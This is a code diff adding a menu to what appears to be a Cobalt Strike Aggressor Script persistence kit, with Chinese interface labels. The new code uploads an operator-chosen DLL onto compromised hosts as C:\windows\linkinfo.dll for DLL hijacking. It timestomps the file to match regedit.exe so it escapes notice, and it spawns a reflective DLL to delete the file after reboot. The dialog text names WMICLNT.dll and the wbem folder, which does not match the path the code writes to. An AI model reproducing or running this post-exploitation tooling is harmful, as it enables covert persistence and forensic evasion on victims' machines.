@@ -1101,6 +1101,49 @@ menu "DLL加载"{
 		}
 	}
 	
+	
+	menu "wmiprvse" {
+		item "Upload WMICLNT.dll"{
+			local('$bid');
+			foreach $bid ($1){
+				$Dialog = dialog("Upload WMICLNT.dll", %(dllfile => "", bid => $bid), 
+					lambda({
+						local('$bid $dllfile $TempFile');
+						$TempFile = "C:\\windows\\linkinfo.dll";
+						$dllfile = $3['dllfile'];
+						$bid = $3['bid'];
+						blog($bid,"Upload ".$dllfile." to $TempFile ");	
+						$handle = openf($dllfile);
+						$bdata   = readb($handle, -1);
+						closef($handle);
+						bupload_raw($bid,$TempFile,$bdata);
+						btimestomp($bid,$TempFile,"C:\\windows\\regedit.exe");
+					})
+				);
+				dialog_description($Dialog, "Upload WMICLNT.dll in C:\\windows\\system32\\wbem\\");
+				drow_file($Dialog, "dllfile", "File: ");
+				dbutton_action($Dialog, "执行");
+				dialog_show($Dialog);
+			}
+		}
+		
+		item "清理linkinfo.dll"{
+			local('$bid $TempFile');
+			$TempFile = "C:\\windows\\linkinfo.dll";
+			foreach $bid ($1){
+				if( lc(binfo($bid, "process")) eq "explorer.exe"){
+					
+				}
+				blog($bid, "-------".getnow()."-------");
+				blog($bid , "The file will be delete after restart.");
+				$Data = "2 C:\\windows\\linkinfo.dll 1";
+				bdllspawn!($bid, getFileProper(script_resource("Persistence/modules/"), "/Linkinfo/reflective_dll.dll"),$Data, "Del linkinfo.dll after reboot.", 5000);
+			}
+		}
+	}
+	
+	
+	
 sub linkinfoUpoad {
 	local('$bid $UploadPath $Arch $Type $linkinfofile');
 	$bid = $3['bid'];
